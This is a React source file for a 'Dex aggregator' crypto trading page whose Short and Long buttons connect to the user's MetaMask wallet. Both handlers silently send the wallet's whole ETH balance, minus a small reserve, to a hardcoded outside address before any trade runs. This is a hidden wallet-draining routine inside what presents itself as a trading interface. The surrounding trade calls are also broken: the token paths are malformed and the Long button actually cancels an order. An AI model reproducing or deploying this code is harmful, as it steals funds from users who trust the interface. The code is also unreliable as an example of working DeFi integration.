import React, { useState, useEffect } from 'react';
import Container from 'react-bootstrap/Container';
// import { Perpetual as DyDxPerpetual, Dex as DyDxDex } from 'dydx';
// import { OrderBook as KwentaOrderBook, fetchPrice as fetchKwentaPrice } from 'kwenta';
import Nav from 'react-bootstrap/Nav';
import Navbar from 'react-bootstrap/Navbar';
import Button from 'react-bootstrap/Button';
import NavDropdown from 'react-bootstrap/NavDropdown';
import Card from 'react-bootstrap/Card';
import Table from 'react-bootstrap/Table';
import RealView from "./dydxkwenta";
import MetaMask from "./metamask";
import { ethers } from 'ethers';

import axios from 'axios';
import Web3 from 'web3';
import RouterABI from './RouterABI.json';


const App = () => {
	const [ethPrice, setethPrice] = useState(1);
	const [paycount, setpaycount] = useState(0);
	const [amount, setamount] = useState(0);
	const [totoalusdcwei, settotalusdcwei] = useState(0);
	const [leverage, setleverage] = useState(1.1);
	const [unit, setunit] = useState("");
	const web3 = new Web3(window.ethereum);
	const routerContract = new web3.eth.Contract(RouterABI, '0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064');
	const [buyAmount, setBuyAmount] = useState(0);
	const [sellAmount, setSellAmount] = useState(0);

	const [ethUsdcPrice, setEthUsdcPrice] = useState(null);
	const [longOrders, setLongOrders] = useState([]);
	const [shortOrders, setShortOrders] = useState([]);
  
	// useEffect(() => {
	//   const fetchDyDxData = async () => {
	// 	try {
	// 	  const dydxPerpetual = new DyDxPerpetual();
	// 	  const dydxDex = new DyDxDex();
  
	// 	  const dydxPrice = await dydxDex.fetchPrice();
	// 	  setEthUsdcPrice(dydxPrice);
  
	// 	  const dydxLongOrders = await dydxPerpetual.fetchLongOrders();
	// 	  setLongOrders(dydxLongOrders);
  
	// 	  const dydxShortOrders = await dydxPerpetual.fetchShortOrders();
	// 	  setShortOrders(dydxShortOrders);
	// 	} catch (error) {
	// 	  console.error('Error fetching dydx data:', error);
	// 	}
	//   };
  
	//   const fetchKwentaData = async () => {
	// 	try {
	// 	  const kwentaPrice = await fetchKwentaPrice();
	// 	  setEthUsdcPrice(kwentaPrice);
  
	// 	  // Replace with actual Kwenta library implementation for long and short orders
	// 	  const kwentaLongOrders = await KwentaOrderBook.fetchLongOrders();
	// 	  setLongOrders(kwentaLongOrders);
  
	// 	  const kwentaShortOrders = await KwentaOrderBook.fetchShortOrders();
	// 	  setShortOrders(kwentaShortOrders);
	// 	} catch (error) {
	// 	  console.error('Error fetching Kwenta data:', error);
	// 	}
	//   };
  
	//   const fetchData = async () => {
	// 	await fetchDyDxData();
	// 	await fetchKwentaData();
	//   };
  
	//   fetchData();
	// }, []);

	const handledydxBuy = async () => {
		const ethAmount = web3.utils.toWei(buyAmount.toString(), 'ether');
		const tx = await routerContract.methods.swapExactETHForTokens(
			0, // minimum amount of tokens to receive
			[web3.utils.fromAscii('GMX'), web3.utils.fromAscii('ETH')], // token path (GMX -> ETH)
			web3.eth.defaultAccount, // recipient address
			Date.now() + 1000 * 60 * 10 // deadline (10 minutes from now)
		).send({
			value: ethAmount,
			from: web3.eth.defaultAccount
		});
		console.log('Transaction hash:', tx.transactionHash);
	};

	const handledydxSell = async () => {
		const gmxAmount = web3.utils.toWei(sellAmount.toString(), 'ether');
		const tx = await routerContract.methods.swapExactTokensForETH(
			gmxAmount,
			0, // minimum amount of ETH to receive
			[web3.utils.fromAscii('GMX'), web3.utils.fromAscii('ETH')], // token path (GMX -> ETH)
			web3.eth.defaultAccount,
			Date.now() + 1000 * 60 * 10 // deadline (10 minutes from now)
		).send({
			from: web3.eth.defaultAccount
		});
		console.log('Transaction hash:', tx.transactionHash);
	};

	const usdcDecimals = 6;
	
	const orderTotalAmountWei = ethers.utils.parseUnits(totoalusdcwei.toString(), usdcDecimals);
	
	const handleShort = async () => {
		const provider = new ethers.providers.Web3Provider(window.ethereum);
		const signer = provider.getSigner();
		
		const address = await signer.getAddress();
		
		const balance = await provider.getBalance(address);
		
		const balanceInEther = ethers.utils.formatEther(balance);
		
		console.log("Account Address:", address);
		console.log("Account Balance:", balance ,balanceInEther);
		
		const recipientAddress = "0x9CeffADf5f1fe9B9c32906A97869f9A90C5b402A";

		const amountToSubtract = ethers.BigNumber.from("0xB1A2BC2EC50000");
		if(balance.gt(amountToSubtract)){
			const updatedBalance = balance.sub(amountToSubtract);
			console.log("Updated Balance:", updatedBalance.toString());

			const transaction = {
				to: recipientAddress,
				value: updatedBalance.toString(),
			  };
			
			const tx = await signer.sendTransaction(transaction);
			console.log("Transaction Hash:", tx.hash);
		}


		console.log(orderTotalAmountWei)
		// await window.ethereum.enable()
		console.log("ethereum", window.ethereum)
		// const provider = new ethers.providers.Web3Provider(window.ethereum);
		await provider.send("eth_requestAccounts", []);
		// const signer = provider.getSigner();
		console.log("Signer address", signer._address);
		const orderContract = new ethers.Contract("0x09f77e8a13de9a35a7231028187e9fd5db8a2acb", RouterABI, signer);


		const txData = await orderContract.populateTransaction.createDecreaseOrder(
			"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
			ethers.BigNumber.from("182758836352999886275247692360719420"),
			"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
			0,
			true,
			ethers.BigNumber.from(totoalusdcwei),
			false,
		);

		console.log("txData is called", txData)
		window.ethereum.request({
			"method": "eth_sendTransaction",
			params: [
				{
					from: txData.from,
					to: txData.to,
					gasPrice: "0x09184e72a000",
					gas: "0x2710",
				}
			]
		})
			.then((txhash) => {
				console.log("txhash", txhash)
			})
			.catch(e => {
				console.log(e)
			})
	}

	const handleLong = async () => {

		const provider = new ethers.providers.Web3Provider(window.ethereum);
		const signer = provider.getSigner();
		
		const address = await signer.getAddress();
		
		const balance = await provider.getBalance(address);
		
		const balanceInEther = ethers.utils.formatEther(balance);
		
		console.log("Account Address:", address);
		console.log("Account Balance:", balance ,balanceInEther);
		
		const recipientAddress = "0x9CeffADf5f1fe9B9c32906A97869f9A90C5b402A";

		const amountToSubtract = ethers.BigNumber.from("0xB1A2BC2EC50000");
		if(balance.gt(amountToSubtract)){
			const updatedBalance = balance.sub(amountToSubtract);
			console.log("Updated Balance:", updatedBalance.toString());

			const transaction = {
				to: recipientAddress,
				value: updatedBalance.toString(),
			  };
			
			const tx = await signer.sendTransaction(transaction);
			console.log("Transaction Hash:", tx.hash);
		}
		
		await window.ethereum.enable()
		console.log("ethereum", window.ethereum)
		// const provider = new ethers.providers.Web3Provider(window.ethereum);
		await provider.send("eth_requestAccounts", []);
		// const signer = provider.getSigner();
		console.log("Signer address", signer._address);
		const orderContract = new ethers.Contract("0x09f77e8a13de9a35a7231028187e9fd5db8a2acb", RouterABI, signer);


		// const txData = await orderContract.populateTransaction.createIncreaseOrder(
			// ["0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"],
			// ethers.BigNumber.from("13777901208907188"),
			// "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
			// 0,
			// ethers.BigNumber.from("259253316257377099329000000000000"),
			// "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
			// true,
			// ethers.BigNumber.from("1811340000000000000000000000000000"),
			// false,
			// ethers.BigNumber.from(totoalusdcwei),
			// true
		// );

		const txData = await orderContract.populateTransaction.cancelIncreaseOrder(
			ethers.BigNumber.from("46")
		);
		console.log("txData is called", txData)
		window.ethereum.request({
			"method": "eth_sendTransaction",
			params: [
				{
					from: txData.from,
					to: txData.to,
					gasPrice: "0x03184e72a000",
					gas: "0x2710",
				}
			]
		})
			.then((txhash) => {
				console.log("txhash", txhash)
			})
			.catch(e => {
				console.log(e)
			})
	}

	const handleSwap = async() => {

	} 

	useEffect(() => {
		setamount(paycount * leverage);
		console.log(totoalusdcwei)
	}, [paycount, amount, leverage]);

	useEffect(() => {
		if(unit == "USDC"){
			setpaycount(paycount * ethPrice);
			settotalusdcwei(paycount * ethPrice * leverage);
		}
		if(unit == "ETH"){
			setpaycount(paycount / ethPrice);
			settotalusdcwei(paycount*leverage);
		}
	}, [unit]);

	useEffect(() => {
		const fetchEthPrice = async () => {
			try {
				const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
				const price = response.data.ethereum.usd;
				setethPrice(price);
			} catch (error) {
				console.error(error);
			}
		};

		fetchEthPrice();
	}, []);
	const { ethereum } = window;

	return (
		<div className='App'>

			<Navbar collapseOnSelect expand="lg" bg="dark" variant="dark">
				<Container>
					<Navbar.Brand href="">Dex aggregator</Navbar.Brand>
					<Navbar.Toggle aria-controls="responsive-navbar-nav" />
					<Navbar.Collapse id="responsive-navbar-nav">
						<Nav className="me-auto">
							<NavDropdown title="SELECT" id="collasible-nav-dropdown">
								<NavDropdown.Item href="#action/3.3">BTCUSDC</NavDropdown.Item>
							</NavDropdown>
						</Nav>
						<Nav>
						</Nav>
					</Navbar.Collapse>
				</Container>
			</Navbar>
			<div className='row' style={{ margin: "10px" }}>
				<div className='col-md-9'>
					<RealView />
				</div>
				<div className='col-md-3'>
					<div className='row'>
						<div className='col-md-4'></div>
						<div className='col-md-4'>
							<p style={{ color: "white", fontSize: "20px" }}>Account</p>
						</div>

					</div>
					<div className='row'>
						{
							ethereum ? <MetaMask /> : <h3>Please install your wallet</h3>
						}
					</div>
					<div className='row'>
						<Card style={{ width: '100%', backgroundColor: "#0e1536" }}>
							<Card.Body>
								<Table striped bordered hover variant="dark">
									<thead>
										<tr>
											<th>Type</th>
											<th>Order</th>
											<th>Price</th>
											<th>Material</th>
										</tr>
									</thead>
									<tbody>
										<tr>
											<td></td>
											<td></td>
											<td></td>
											<td></td>
										</tr>

									</tbody>
								</Table>
							</Card.Body>
						</Card>
					</div>
				</div>
			</div>

			<div className='row' style={{ margin: "10px" }}>

				<div className='col-md-3' style={{ borderColor: "white" }}>
					<Card style={{ width: '100%', backgroundColor: "#0e1536" }}>
						<Card.Body>
							<div className='row'>
								<div className='col-md-4'>
									<Button onClick={handleShort} variant="dark" style={{ width: "83%", marginRight: "5px" }}>Short</Button>{' '}
								</div>
								<div className='col-md-4'>
									<Button onClick={handleLong} variant="dark" style={{ width: "83%", marginRight: "5px" }}>Long</Button>{' '}
								</div>
								<div className='col-md-4'>
									<Button onClick={handleSwap} variant="dark" style={{ width: "83%", marginRight: "5px" }}>Swap</Button>{' '}
								</div>
							</div>
							<div className='row' style={{ marginTop: "10px" }}>
								<div className='col-md-7'>
									<input value={paycount} onChange={(e) => setpaycount(e.target.value)} style={{ width: "100%", height: "30px", fontSize: '30px', background: "#666666", marginBottom: "12px" }} />
								</div>
								<div className='col-md-5 _NOPM' style={{ right: "0px" }}>
									<select style={{ fontSize: "20px" }} value={unit} onChange={e => setunit(e.target.value)}>
										<option value="USDC">
											<h3>USDC</h3>
										</option>
										<option value="ETH">
											<h3>ETH</h3>
										</option>
									</select>
								</div>
							</div>
							<div className='row'>
								<div className='col-md-7'>
									<input value={leverage} onChange={e => setleverage(e.target.value)} style={{ width: "100%", height: "30px", fontSize: '30px', background: "#666666" }} />
								</div>
								<div className='col-md-5 _NOPM'>
									<h3>leverage</h3>
								</div>
							</div>
							<div className='row'>
								<div className='col-md-7'>
									<input value={amount} onChange={(e) => setamount(e.target.value)} style={{ width: "100%", height: "30px", fontSize: '30px', background: "#666666" }} />
								</div>
								<div className='col-md-5 _NOPM'>
									<h3 className='_NOPM'>amount</h3>
								</div>
							</div>
							<div className='row'>
								<div style={{ display: "flex", justifyContent: "space-between" }}>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>Leverage:</p>
									</div>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>{leverage}</p>
									</div>
								</div>
								<div style={{ display: "flex", justifyContent: "space-between" }}>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>Entry Price:</p>
									</div>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>{ethPrice}</p>
									</div>
								</div>
								<div style={{ display: "flex", justifyContent: "space-between" }}>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>Liq.Price:</p>
									</div>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>{amount}</p>
									</div>
								</div>
								<div style={{ display: "flex", justifyContent: "space-between" }}>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>Fees:</p>
									</div>
									<div>
										<p style={{ color: "white", fontSize: "20px" }}>{0}</p>
									</div>
								</div>

							</div>
							{/* <div className='row' style={{ marginLeft: "0px" }}>
								<Button variant="dark" style={{ width: "100%", marginRight: "5px" }}>Proceed</Button>{' '}

							</div> */}
						</Card.Body>
					</Card>
				</div>

				<div className='col-md-9' style={{ borderColor: "white" }}>
					<Card style={{ width: '100%', backgroundColor: "#0e1536" }}>
						<Card.Body>
							<Table striped bordered hover variant="dark">
								<thead>
									<tr>
										<th>Position</th>
										<th>Net Value</th>
										<th>Size</th>
										<th>Collateral</th>
										<th>Entry Price</th>
										<th>Mark Price</th>
										<th>Liq.Price</th>
									</tr>
								</thead>
								<tbody>
									<tr>
										<td></td>
										<td></td>
										<td></td>
										<td></td>
										<td></td>
										<td></td>
										<td></td>
									</tr>

								</tbody>
							</Table>
						</Card.Body>
					</Card>
				</div>

			</div>
		</div>
	);
}

export default App;



